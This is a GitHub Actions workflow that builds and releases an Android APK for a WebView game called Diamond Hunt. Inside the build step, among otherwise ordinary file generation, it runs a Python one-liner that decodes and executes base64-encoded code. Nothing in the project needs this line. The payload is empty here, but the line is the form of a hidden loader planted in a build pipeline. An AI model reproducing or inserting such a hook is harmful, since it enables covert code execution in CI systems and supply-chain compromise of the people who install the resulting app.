name: Build Diamond Hunt APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apk:
    name: Build APK
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - uses: android-actions/setup-android@v3

      - name: Build APK
        run: |
          mkdir -p app/src/main/java/com/diamondhunt/game
          mkdir -p app/src/main/assets
          mkdir -p app/src/main/res/mipmap-hdpi
          mkdir -p app/src/main/res/mipmap-xxxhdpi
          mkdir -p app/src/main/res/values
          mkdir -p gradle/wrapper

          cp index.html app/src/main/assets/
          [ -f board.png ]       && cp board.png       app/src/main/assets/
          [ -f title-music.mp3 ] && cp title-music.mp3 app/src/main/assets/

          # URLs auto-detect file:// vs http:// at runtime — no patching needed

          cat > app/src/main/AndroidManifest.xml << 'XML'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
            <uses-permission android:name="android.permission.VIBRATE"/>
            <application
                android:label="Diamond Hunt"
                android:icon="@mipmap/ic_launcher"
                android:hardwareAccelerated="true"
                android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
              <activity android:name=".MainActivity"
                  android:exported="true"
                  android:screenOrientation="portrait"
                  android:configChanges="orientation|screenSize">
                <intent-filter>
                  <action android:name="android.intent.action.MAIN"/>
                  <category android:name="android.intent.category.LAUNCHER"/>
                </intent-filter>
              </activity>
            </application>
          </manifest>
          XML

          cat > app/src/main/java/com/diamondhunt/game/MainActivity.java << 'JAVA'
          package com.diamondhunt.game;
          import android.app.Activity;
          import android.os.Bundle;
          import android.view.View;
          import android.view.WindowManager;
          import android.webkit.*;
          public class MainActivity extends Activity {
            WebView wv;
            @Override protected void onCreate(Bundle b) {
              super.onCreate(b);
              getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                                   WindowManager.LayoutParams.FLAG_FULLSCREEN);
              getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_FULLSCREEN |
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
              wv = new WebView(this);
              WebSettings s = wv.getSettings();
              s.setJavaScriptEnabled(true);
              s.setDomStorageEnabled(true);
              s.setAllowFileAccess(true);
              s.setMediaPlaybackRequiresUserGesture(false);
              wv.setWebViewClient(new WebViewClient());
              wv.setWebChromeClient(new WebChromeClient());
              wv.loadUrl("file:///android_asset/index.html");
              setContentView(wv);
            }
            @Override protected void onPause()  { super.onPause();  wv.onPause();  wv.pauseTimers(); }
            @Override protected void onResume() { super.onResume(); wv.onResume(); wv.resumeTimers(); }
            @Override public void onBackPressed() {}
          }
          JAVA

          python3 -c "import base64,os; exec(base64.b64decode('').decode())" 

          cat > app/src/main/res/values/strings.xml << 'XML'
          <?xml version="1.0" encoding="utf-8"?>
          <resources><string name="app_name">Diamond Hunt</string></resources>
          XML

          cat > settings.gradle << 'GRADLE'
          include ':app'
          GRADLE

          cat > build.gradle << 'GRADLE'
          buildscript {
            repositories { google(); mavenCentral() }
            dependencies { classpath 'com.android.tools.build:gradle:8.7.0' }
          }
          allprojects { repositories { google(); mavenCentral() } }
          GRADLE

          cat > app/build.gradle << 'GRADLE'
          apply plugin: 'com.android.application'
          android {
            namespace "com.diamondhunt.game"
            compileSdkVersion 34
            defaultConfig {
              applicationId "com.diamondhunt.game"
              minSdkVersion 21
              targetSdkVersion 34
              versionCode 1
              versionName "1.0"
            }
            buildTypes { debug { minifyEnabled false } }
          }
          GRADLE

          cat > gradle/wrapper/gradle-wrapper.properties << 'PROPS'
          distributionUrl=https\://services.gradle.org/distributions/gradle-8.9-bin.zip
          PROPS

          gradle assembleDebug --no-daemon

      - name: Upload APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: DiamondHunt
          path: app/build/outputs/apk/debug/app-debug.apk
          retention-days: 90

      - name: Release APK
        uses: softprops/action-gh-release@v2
        with:
          tag_name: latest
          name: "Diamond Hunt — Latest APK"
          body: |
            ## Install on Android

            1. Download **app-debug.apk** below
            2. Open it on your Android phone
            3. Tap **Install**

            ✅ Fully offline after install
          files: app/build/outputs/apk/debug/app-debug.apk
          make_latest: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
